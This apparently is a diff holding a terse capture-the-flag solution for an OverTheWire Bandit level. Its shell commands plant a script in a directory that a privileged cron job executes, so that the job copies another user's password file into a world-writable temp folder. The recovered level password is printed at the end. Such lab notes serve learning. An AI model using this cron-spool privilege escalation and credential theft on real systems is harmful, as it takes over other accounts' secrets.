@@ -1,0 +1,15 @@
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mktemp -d
+vim script.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.xCIvIoTFAm/pass
+
+chmod 777 script.sh
+chmod 777 /tmp/tmp.xCIvIoTFAm
+touch pass
+
+cp ./script.sh /var/spool/bandit24/foo/script.sh
+cat pass
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
